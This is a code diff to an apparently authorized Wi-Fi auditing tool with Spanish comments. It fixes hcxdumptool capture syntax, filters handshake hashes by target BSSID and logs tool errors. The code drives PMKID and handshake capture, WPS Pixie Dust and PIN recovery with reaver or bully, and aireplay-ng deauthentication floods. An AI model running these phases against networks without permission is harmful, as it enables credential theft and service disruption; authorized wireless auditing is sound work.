@@ -220,8 +220,10 @@ def _pcap_captured(path: str) -> bool:
         return False
 
 
-def _ensure_hc22000(run_dir: str) -> Optional[str]:
-    """Convierte pcapng capturado a hc22000 con hcxpcapngtool. Retorna ruta o None."""
+def _ensure_hc22000(run_dir: str, bssid: Optional[str] = None) -> Optional[str]:
+    """Convierte pcapng a hc22000 con hcxpcapngtool. Si se da bssid y existe
+    hcxhashtool, filtra el hash a ese AP (--mac-ap) para no atribuir
+    credenciales ajenas del mismo canal. Retorna ruta o None."""
     hash_path = f"{run_dir}/handshake.hc22000"
     if os.path.isfile(hash_path) and os.path.getsize(hash_path) > 0:
         return hash_path
@@ -231,6 +233,16 @@ def _ensure_hc22000(run_dir: str) -> Optional[str]:
         if _pcap_captured(src):
             res = _run_tool(["hcxpcapngtool", "-o", hash_path, src], timeout=30)
             if res["returncode"] == 0 and os.path.isfile(hash_path):
+                if bssid and _tool_available("hcxhashtool"):
+                    filt = f"{run_dir}/handshake_target.hc22000"
+                    fr = _run_tool(["hcxhashtool", "-i", hash_path,
+                                    "-o", filt, f"--mac-ap={bssid}"],
+                                   timeout=30)
+                    try:
+                        if fr["returncode"] == 0 and os.path.getsize(filt) > 0:
+                            os.replace(filt, hash_path)
+                    except OSError:
+                        pass
                 return hash_path
     return None
 
@@ -297,9 +309,89 @@ def _airodump_round(target: TargetInfo, iface: str, run_dir: str,
     return _pcap_captured(cap)
 
 
+def _save_stderr(run_dir: str, name: str, result: Dict[str, Any]) -> None:
+    """Persiste el stderr de una herramienta fallida en evidence/.
+
+    Sin esto los 'error' de fase son opacos (lección 2026-09-15: 13 errores
+    sin rastro). Nunca rompe la run.
+    """
+    try:
+        err = (result or {}).get("stderr", "") or ""
+        out = (result or {}).get("stdout", "") or ""
+        text = f"$ rc={result.get('returncode')} timed_out={result.get('timed_out')}\n"
+        if out.strip():
+            text += f"--- stdout (cola) ---\n{out[-2000:]}\n"
+        if err.strip():
+            text += f"--- stderr (cola) ---\n{err[-2000:]}\n"
+        if text.strip():
+            with open(os.path.join(run_dir, f"{name}_stderr.log"), "w") as f:
+                f.write(text)
+    except OSError:
+        pass
+
+
+def _channel_arg(channel: int) -> str:
+    """Canal en formato hcxdumptool (banda obligatoria): 6→'6a', 36→'36b'."""
+    try:
+        ch = int(channel)
+    except (TypeError, ValueError):
+        ch = 6
+    if ch < 1:
+        ch = 6
+    return f"{ch}a" if ch <= 14 else f"{ch}b"
+
+
+def _target_bpf(target: "TargetInfo", run_dir: str, prefix: str) -> Optional[str]:
+    """Compila filtro BPF por BSSID del objetivo (recomendación upstream
+    hcxdumptool). Retorna ruta .bpf o None (captura por canal sin filtrar)."""
+    if not _tool_available("tcpdump"):
+        return None
+    bpf_path = os.path.join(run_dir, f"{prefix}.bpf")
+    mac = target.bssid
+    filt = (f"wlan addr1 {mac} or wlan addr2 {mac} or wlan addr3 {mac} "
+            f"or (wlan type mgt and wlan subtype probe-req)")
+    try:
+        proc = subprocess.run(
+            ["tcpdump", "-i", "lo", "-ddd", filt],
+            capture_output=True, text=True, timeout=15,
+        )
+        if proc.returncode == 0 and proc.stdout.strip():
+            with open(bpf_path, "w") as f:
+                f.write(proc.stdout)
+            return bpf_path
+    except (OSError, subprocess.TimeoutExpired, ValueError):
+        pass
+    return None
+
+
+def _hcx_capture(target: "TargetInfo", iface: str, run_dir: str,
+                 prefix: str, seconds: int, desc: str) -> tuple[bool, Dict[str, Any]]:
+    """Captura con sintaxis válida hcxdumptool 6.3.1.
+
+    Los flags antiguos (--filterlist_ap/--filtermode/-o/--rcascan=<seg>)
+    NO existen en 6.x y hacían fallar todo CAPTURE al instante: salida con
+    -w, canal con banda (-c 6a), --rcascan=p (pasivo, carácter, no segundos),
+    --tot en minutos y BPF por objetivo cuando hay tcpdump.
+    Retorna (material_capturado, result).
+    """
+    import math
+    pcap_path = os.path.join(run_dir, f"{prefix}.pcapng")
+    tot_min = max(1, math.ceil((seconds + 15) / 60))
+    cmd = ["hcxdumptool", "-i", iface, "-w", pcap_path,
+           "-c", _channel_arg(target.channel),
+           "--rcascan=p", f"--tot={tot_min}"]
+    bpf = _target_bpf(target, run_dir, prefix)
+    if bpf:
+        cmd.append(f"--bpf={bpf}")
+    result = _run_tool(cmd, timeout=seconds + 10, desc=desc)
+    if result["returncode"] != 0 or result.get("timed_out"):
+        _save_stderr(run_dir, prefix, result)
+    ok = _pcap_captured(pcap_path) or bool(_ensure_hc22000(run_dir, target.bssid))
+    return ok, result
+
+
 def _phase_capture_pmkid(target: TargetInfo, iface: str, run_dir: str) -> str:
     """Batería PMKID: hasta N rondas cortas hasta material convertible."""
-    pcap_path = f"{run_dir}/pmkid.pcapng"
     attempts = MAX_ATTEMPTS.get("CAPTURE_PMKID", 2)
 
     if not _tool_available("hcxdumptool"):
@@ -309,13 +401,11 @@ def _phase_capture_pmkid(target: TargetInfo, iface: str, run_dir: str) -> str:
     timeout = TIMEOUTS["CAPTURE_PMKID"] // attempts
     last = "not_found"
     for rnd in range(1, attempts + 1):
-        result = _run_tool(
-            ["hcxdumptool", "-i", iface, "--filterlist_ap", target.bssid,
-             "--filtermode=2", "-o", pcap_path, f"--rcascan={timeout}"],
-            timeout=timeout + 5,
+        ok, result = _hcx_capture(
+            target, iface, run_dir, "pmkid", timeout,
             desc=f"Capturando PMKID {rnd}/{attempts} · {target.ssid}",
         )
-        if _ensure_hc22000(run_dir) or _pcap_captured(pcap_path):
+        if ok:
             return "captured"
         last = "timeout" if result["timed_out"] else ("error" if result["returncode"] != 0 else "not_found")
     return last
@@ -336,15 +426,11 @@ def _phase_capture_handshake(target: TargetInfo, iface: str, run_dir: str) -> st
     # Ronda 1: hcxdumptool pasivo (rápido, sin inyección)
     if "hcxdumptool" in tools:
         timeout = TIMEOUTS["CAPTURE_HANDSHAKE"] // 2
-        result = _run_tool(
-            ["hcxdumptool", "-i", iface, "--filterlist_ap", target.bssid,
-             "--filtermode=2", "-o", pcap_path, f"--rcascan={timeout}"],
-            timeout=timeout + 5,
+        ok, result = _hcx_capture(
+            target, iface, run_dir, "handshake", timeout,
             desc=f"Captura pasiva 1/{attempts} · {target.ssid}",
         )
-        if _ensure_hc22000(run_dir):
-            return "captured"
-        if _pcap_captured(pcap_path):
+        if ok:
             return "captured"
 
     # Rondas 2..N: airodump + deauth (requiere inyección; solo con scope firmado)
@@ -363,7 +449,7 @@ def _phase_capture_handshake(target: TargetInfo, iface: str, run_dir: str) -> st
     return "not_found" if _pcap_captured(pcap_path) is False else "captured"
 
 
-def _phase_wps_class(target: TargetInfo, iface: str) -> tuple[str, Optional[str], Optional[str]]:
+def _phase_wps_class(target: TargetInfo, iface: str, run_dir: str = "") -> tuple[str, Optional[str], Optional[str]]:
     """Valida la clase WPS con reaver/bully (pixie dust + pin class)."""
     timeout = TIMEOUTS["WPS_CLASS"]
 
@@ -380,6 +466,8 @@ def _phase_wps_class(target: TargetInfo, iface: str) -> tuple[str, Optional[str]
     )
 
     if result["timed_out"]:
+        if run_dir:
+            _save_stderr(run_dir, "wps_class", result)
         return "timeout", None, None
     out_low = (result["stdout"] + result["stderr"]).lower()
     if any(m in out_low for m in WPS_LOCKOUT_MARKERS):
@@ -390,10 +478,12 @@ def _phase_wps_class(target: TargetInfo, iface: str) -> tuple[str, Optional[str]
         psk = creds.get("psk")
         val = f"PIN: {pin} | PSK: {psk}" if psk and pin else (f"PIN: {pin}" if pin else (psk or "PIN de clase predecible detectado"))
         return "class_confirmed", val, "WPS PIN (Clase conocida)"
+    if run_dir:
+        _save_stderr(run_dir, "wps_class", result)
     return "not_found", None, None
 
 
-def _phase_wps_pixie(target: TargetInfo, iface: str) -> tuple[str, Optional[str], Optional[str]]:
+def _phase_wps_pixie(target: TargetInfo, iface: str, run_dir: str = "") -> tuple[str, Optional[str], Optional[str]]:
     """Pixie Dust WPS (solo WPS v1). reaver -K 1 (usa pixiewps) o bully -d."""
     timeout = TIMEOUTS["WPS_PIXIE"]
     if _tool_available("reaver"):
@@ -414,7 +504,10 @@ def _phase_wps_pixie(target: TargetInfo, iface: str) -> tuple[str, Optional[str]
         timeout=timeout,
         desc=f"WPS Pixie Dust ({motor}) · {target.ssid}",
     )
-    if result["timed_out"]: return "timeout", None, None
+    if result["timed_out"]:
+        if run_dir:
+            _save_stderr(run_dir, "wps_pixie", result)
+        return "timeout", None, None
     out_low = (result["stdout"] + result["stderr"]).lower()
     if any(m in out_low for m in WPS_LOCKOUT_MARKERS):
         return "locked", None, None
@@ -424,6 +517,8 @@ def _phase_wps_pixie(target: TargetInfo, iface: str) -> tuple[str, Optional[str]
         psk = creds.get("psk")
         val = f"PIN: {pin} | PSK: {psk}" if psk and pin else (f"PIN: {pin}" if pin else (psk or "PIN/PSK recuperado"))
         return "cracked", val, "WPS Pixie Dust"
+    if run_dir:
+        _save_stderr(run_dir, "wps_pixie", result)
     return "not_found", None, None
 
 
@@ -717,8 +812,12 @@ def _phase_eol_governance(target: TargetInfo, profile: Profile, run_dir: str) ->
     return "not_found"
 
 
-def _phase_resilience_test(target: TargetInfo, iface: str) -> str:
-    """Envía frames de deauth y mide tiempo de recuperación del AP."""
+def _phase_resilience_test(target: TargetInfo, iface: str, run_dir: str) -> str:
+    """Envía frames de deauth y mide tiempo de recuperación del AP.
+
+    Requiere monitor real: sin él aireplay falla y el 'error' quedaría
+    opaco, así que se guarda stderr en evidence y se diagnostica.
+    """
     if not _tool_available("aireplay-ng"):
         console.print("  [yellow]aireplay-ng no disponible — resiliencia degradada[/yellow]")
         return "skipped"
@@ -727,7 +826,15 @@ def _phase_resilience_test(target: TargetInfo, iface: str) -> str:
         timeout=30,
         desc=f"Prueba de resiliencia · {target.ssid}",
     )
-    return "done" if result["returncode"] == 0 else "error"
+    if result["returncode"] == 0:
+        return "done"
+    _save_stderr(run_dir, "resilience", result)
+    err_low = ((result.get("stderr") or "") + (result.get("stdout") or "")).lower()
+    if "no such device" in err_low or "no such file" in err_low:
+        console.print(f"  [yellow]aireplay sin interfaz ({iface}) — ¿modo monitor inactivo?[/yellow]")
+    elif "monitor" in err_low or "operation not supported" in err_low or "not supported" in err_low:
+        console.print(f"  [yellow]aireplay exige monitor en {iface} — inyección no disponible[/yellow]")
+    return "error"
 
 
 def _phase_audit_lan_surface(target: TargetInfo, run_dir: str,
@@ -832,7 +939,7 @@ def run_single_target(
                 r = _phase_capture_handshake(target, iface, run_dir)
 
             elif phase == "WPS_CLASS":
-                r, key_val, type_val = _phase_wps_class(target, iface)
+                r, key_val, type_val = _phase_wps_class(target, iface, run_dir)
                 if r == "locked":
                     console.print("  [yellow]AP en lockout — deteniendo path aéreo[/yellow]")
                     final_result = "locked"
@@ -840,7 +947,7 @@ def run_single_target(
                     break
 
             elif phase == "WPS_PIXIE":
-                r, key_val, type_val = _phase_wps_pixie(target, iface)
+                r, key_val, type_val = _phase_wps_pixie(target, iface, run_dir)
 
             elif phase == "PSK_SSID_LOGIC":
                 r, key_val, type_val = _phase_psk_ssid_logic(target, run_dir, family_keys=known_keys)
@@ -855,7 +962,7 @@ def run_single_target(
                 r = _phase_audit_lan_surface(target, run_dir, scope, allow_lan)
 
             elif phase == "RESILIENCE_TEST":
-                r = _phase_resilience_test(target, iface)
+                r = _phase_resilience_test(target, iface, run_dir)
 
             elif phase == "VALIDATE_COUNTERMEASURE":
                 console.print("  [dim]Validación de contramedidas — registrado.[/dim]")
